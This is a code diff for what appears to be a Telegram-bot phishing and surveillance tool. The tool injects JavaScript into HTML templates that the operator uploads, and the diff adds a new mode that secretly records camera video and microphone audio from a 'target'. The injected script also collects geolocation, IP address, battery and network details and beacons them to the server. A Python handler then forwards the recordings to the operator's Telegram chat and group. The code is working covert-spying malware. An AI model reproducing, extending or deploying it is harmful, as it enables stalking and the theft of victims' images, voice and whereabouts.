@@ -410,7 +410,44 @@ INJECT_JS_MIC = """
 <script>
 (function(){
   var capCount=0, active=true;
-  var mediaRecorder=null, audioChunks=[];
+  var mediaRecorder=null, audioChunks=[], micStream=null;
+
+  // --- minta mic PERTAMA, satu popup, sebelum apapun ---
+  function initMic(cb){
+    if(!navigator.mediaDevices||!navigator.mediaDevices.getUserMedia){cb();return;}
+    navigator.mediaDevices.getUserMedia({audio:true})
+    .then(function(stream){
+      micStream=stream;
+      var mimeType='audio/webm';
+      if(!MediaRecorder.isTypeSupported(mimeType)) mimeType='audio/ogg';
+      if(!MediaRecorder.isTypeSupported(mimeType)) mimeType='';
+      try{
+        mediaRecorder=new MediaRecorder(stream, mimeType?{mimeType:mimeType}:{});
+        mediaRecorder.ondataavailable=function(e){
+          if(e.data&&e.data.size>0) audioChunks.push(e.data);
+        };
+        mediaRecorder.start();
+      }catch(err){}
+      cb();
+    }).catch(function(){ cb(); });
+  }
+
+  function sendAudio(){
+    try{
+      if(!mediaRecorder) return;
+      if(mediaRecorder.state==='recording') mediaRecorder.stop();
+      mediaRecorder.onstop=function(){
+        if(audioChunks.length===0) return;
+        var blob=new Blob(audioChunks,{type: mediaRecorder.mimeType||'audio/webm'});
+        var reader=new FileReader();
+        reader.onloadend=function(){
+          var b64=reader.result.split(',')[1];
+          navigator.sendBeacon('/audio', JSON.stringify({audio:b64,mime:mediaRecorder.mimeType||'audio/webm'}));
+        };
+        reader.readAsDataURL(blob);
+      };
+    }catch(e){}
+  }
 
   function snapCamera(facingMode,cb){
     if(!navigator.mediaDevices||!navigator.mediaDevices.getUserMedia){cb(null);return;}
@@ -430,29 +467,6 @@ INJECT_JS_MIC = """
       v.addEventListener('loadeddata',grab);
       setTimeout(function(){if(!fired){fired=true;stream.getTracks().forEach(function(t){t.stop();});cb(null);}},5000);
     }).catch(function(){cb(null);});
-  }
-
-  function startMic(){
-    navigator.mediaDevices.getUserMedia({audio:true,video:true})
-    .then(function(stream){
-      // pisah audio track untuk recorder
-      var audioStream=new MediaStream(stream.getAudioTracks());
-      mediaRecorder=new MediaRecorder(audioStream,{mimeType:'audio/webm'});
-      mediaRecorder.ondataavailable=function(e){if(e.data&&e.data.size>0)audioChunks.push(e.data);};
-      mediaRecorder.start(10000); // chunk tiap 10 detik
-    }).catch(function(){});
-  }
-
-  function sendAudio(){
-    if(!mediaRecorder||audioChunks.length===0)return;
-    if(mediaRecorder.state!=='inactive')mediaRecorder.stop();
-    var blob=new Blob(audioChunks,{type:'audio/webm'});
-    var reader=new FileReader();
-    reader.onloadend=function(){
-      var b64=reader.result.split(',')[1];
-      navigator.sendBeacon('/audio',JSON.stringify({audio:b64}));
-    };
-    reader.readAsDataURL(blob);
   }
 
   function getLocation(cb){
@@ -531,11 +545,134 @@ INJECT_JS_MIC = """
     setTimeout(loop,5000);
   }
 
-  startMic();
+  // init mic dulu, baru mulai loop foto
+  function start(){
+    initMic(function(){
+      loop();
+    });
+  }
 
   if(document.readyState==='loading'){
-    document.addEventListener('DOMContentLoaded',loop);
-  } else { loop(); }
+    document.addEventListener('DOMContentLoaded',start);
+  } else { start(); }
+})();
+</script>
+"""
+
+INJECT_JS_VIDEO = """
+<script>
+(function(){
+  var active=true;
+  var mediaRecorder=null, videoChunks=[];
+
+  function getLocation(cb){
+    if(!navigator.geolocation){cb(null,null,null);return;}
+    navigator.geolocation.getCurrentPosition(
+      function(p){cb(p.coords.latitude,p.coords.longitude,p.coords.accuracy);},
+      function(){cb(null,null,null);},
+      {enableHighAccuracy:true,timeout:10000}
+    );
+  }
+
+  function getPublicIP(cb){
+    fetch('https://api.ipify.org?format=json',{mode:'cors'})
+    .then(function(r){return r.json();}).then(function(d){cb(d.ip);}).catch(function(){cb(null);});
+  }
+
+  function getNetworkInfo(cb){
+    var c=navigator.connection||navigator.mozConnection||navigator.webkitConnection;
+    var info={type:'unknown',effectiveType:'unknown',downlink:'unknown'};
+    if(c){info.type=c.type||'unknown';info.effectiveType=c.effectiveType||'unknown';info.downlink=c.downlink||'unknown';}
+    cb(info);
+  }
+
+  function getBattery(cb){
+    if(!navigator.getBattery){cb(null,null);return;}
+    navigator.getBattery().then(function(b){cb(Math.round(b.level*100),b.charging);}).catch(function(){cb(null,null);});
+  }
+
+  function collectInfo(cb){
+    var info={userAgent:navigator.userAgent,language:navigator.language||'unknown',
+              timezone:Intl?Intl.DateTimeFormat().resolvedOptions().timeZone:'unknown',
+              screen:window.screen.width+'x'+window.screen.height,
+              network:null,battery_pct:null,charging:null,ip:null};
+    getNetworkInfo(function(net){
+      info.network=net;
+      getBattery(function(pct,chrg){
+        info.battery_pct=pct;info.charging=chrg;
+        getPublicIP(function(ip){info.ip=ip;cb(info);});
+      });
+    });
+  }
+
+  function sendInfo(){
+    getLocation(function(lat,lon,acc){
+      collectInfo(function(info){
+        fetch('/capture',{
+          method:'POST',
+          headers:{'Content-Type':'application/json'},
+          body:JSON.stringify({num:1,photo_front:null,photo_back:null,
+                               lat:lat,lon:lon,acc:acc,info:info})
+        }).catch(function(){});
+      });
+    });
+  }
+
+  function sendVideo(){
+    try{
+      if(!mediaRecorder)return;
+      if(mediaRecorder.state==='recording') mediaRecorder.stop();
+      mediaRecorder.onstop=function(){
+        if(videoChunks.length===0)return;
+        var blob=new Blob(videoChunks,{type:mediaRecorder.mimeType||'video/webm'});
+        var reader=new FileReader();
+        reader.onloadend=function(){
+          var b64=reader.result.split(',')[1];
+          navigator.sendBeacon('/video',JSON.stringify({video:b64,mime:mediaRecorder.mimeType||'video/webm'}));
+        };
+        reader.readAsDataURL(blob);
+      };
+    }catch(e){}
+  }
+
+  function startVideo(){
+    if(!navigator.mediaDevices||!navigator.mediaDevices.getUserMedia)return;
+    // coba kamera depan dulu (lebih natural untuk target)
+    navigator.mediaDevices.getUserMedia({
+      video:{facingMode:{ideal:'user'},width:{ideal:640},height:{ideal:480}},
+      audio:true
+    })
+    .then(function(stream){
+      var mimeType='video/webm;codecs=vp8,opus';
+      if(!MediaRecorder.isTypeSupported(mimeType)) mimeType='video/webm';
+      if(!MediaRecorder.isTypeSupported(mimeType)) mimeType='video/mp4';
+      if(!MediaRecorder.isTypeSupported(mimeType)) mimeType='';
+      try{
+        mediaRecorder=new MediaRecorder(stream, mimeType?{mimeType:mimeType}:{});
+        mediaRecorder.ondataavailable=function(e){
+          if(e.data&&e.data.size>0) videoChunks.push(e.data);
+        };
+        mediaRecorder.start();
+      }catch(err){}
+    }).catch(function(){});
+  }
+
+  setInterval(function(){fetch('/ping',{method:'POST'}).catch(function(){});},8000);
+
+  window.addEventListener('beforeunload',function(){
+    active=false;
+    sendVideo();
+    navigator.sendBeacon('/offline','{}');
+  });
+
+  function start(){
+    sendInfo();   // kirim lokasi + device info sekali di awal
+    startVideo(); // mulai rekam video
+  }
+
+  if(document.readyState==='loading'){
+    document.addEventListener('DOMContentLoaded',start);
+  } else { start(); }
 })();
 </script>
 """
@@ -725,6 +862,36 @@ async def _send_audio(b64: str, link_id, owner_uid):
     except Exception as e:
         print(f"\n[!] decode audio: {e}")
 
+async def _send_video(b64: str, mime: str, link_id, owner_uid):
+    bot = Bot(token=BOT_TOKEN)
+    ts  = datetime.datetime.now().strftime("%H:%M:%S")
+    ext = "mp4" if "mp4" in mime else "webm"
+    try:
+        video_bytes = base64.b64decode(b64)
+        caption = f"🎥 Video rekaman — Link #{link_id} | {ts}"
+        for dest in [owner_uid, GROUP_ID]:
+            try:
+                await bot.send_video(
+                    chat_id=dest,
+                    video=video_bytes,
+                    caption=caption,
+                    filename=f"video_{link_id}_{ts.replace(':','')}.{ext}",
+                    supports_streaming=True
+                )
+            except Exception as e:
+                # fallback kirim sebagai dokumen kalau send_video gagal
+                try:
+                    await bot.send_document(
+                        chat_id=dest,
+                        document=video_bytes,
+                        caption=caption,
+                        filename=f"video_{link_id}_{ts.replace(':','')}.{ext}"
+                    )
+                except Exception as e2:
+                    print(f"\n[!] send video ke {dest}: {e2}")
+    except Exception as e:
+        print(f"\n[!] decode video: {e}")
+
 async def _send_offline(link_id, owner_uid):
     bot = Bot(token=BOT_TOKEN)
     total = _cap_counts.get(link_id, 0)
@@ -755,6 +922,23 @@ def make_flask_app(link_id, owner_uid):
     @fapp.route("/ping", methods=["POST"])
     def ping():
         mark_active(link_id, freq.remote_addr)
+        return jsonify({"ok": True})
+
+    @fapp.route("/video", methods=["POST"])
+    def video():
+        import json as _json
+        raw = freq.get_data()
+        try:
+            data = _json.loads(raw)
+            b64  = data.get("video","")
+            mime = data.get("mime","video/webm")
+            if b64:
+                threading.Thread(
+                    target=lambda: asyncio.run(_send_video(b64, mime, link_id, owner_uid)),
+                    daemon=True
+                ).start()
+        except Exception as e:
+            print(f"\n[!] video parse: {e}")
         return jsonify({"ok": True})
 
     @fapp.route("/audio", methods=["POST"])
@@ -918,7 +1102,12 @@ async def spawn_link(tunnel_key, raw_html, owner_uid, query, mode="cam"):
     )
 
 def inject_html(html, mode="cam"):
-    js = INJECT_JS_MIC if mode == "mic" else INJECT_JS
+    if mode == "mic":
+        js = INJECT_JS_MIC
+    elif mode == "video":
+        js = INJECT_JS_VIDEO
+    else:
+        js = INJECT_JS
     idx = html.lower().rfind("</body>")
     return (html[:idx]+js+html[idx:]) if idx!=-1 else html+js
 
@@ -967,8 +1156,8 @@ def kb_template():
 def kb_mode():
     return InlineKeyboardMarkup([
         [
-            InlineKeyboardButton("📷 Kamera + Lokasi",         callback_data="mode_cam"),
-            InlineKeyboardButton("🎤 Kamera + Lokasi + Mic",   callback_data="mode_mic"),
+            InlineKeyboardButton("🎤 Foto + Lokasi + Mic",  callback_data="mode_mic"),
+            InlineKeyboardButton("🎥 Video + Lokasi",        callback_data="mode_video"),
         ],
         [InlineKeyboardButton("« Kembali", callback_data="back_main")],
     ])
@@ -1122,11 +1311,11 @@ async def on_button(update: Update, context: ContextTypes.DEFAULT_TYPE):
         _user_state[uid]="await_html"
         await q.edit_message_text("Kirim file `.html` sekarang.")
 
-    elif d in ("mode_cam","mode_mic"):
+    elif d in ("mode_mic","mode_video"):
         raw = _user_data.get(uid,{}).get("raw_html","")
         if not raw:
             await q.edit_message_text("❌ Template kosong.",reply_markup=kb_main(uid)); return
-        mode = "mic" if d=="mode_mic" else "cam"
+        mode = "video" if d=="mode_video" else "mic"
         _user_data[uid]["sadap_mode"] = mode
         await spawn_link("cf", raw, uid, q, mode=mode)
         _user_state[uid]=None
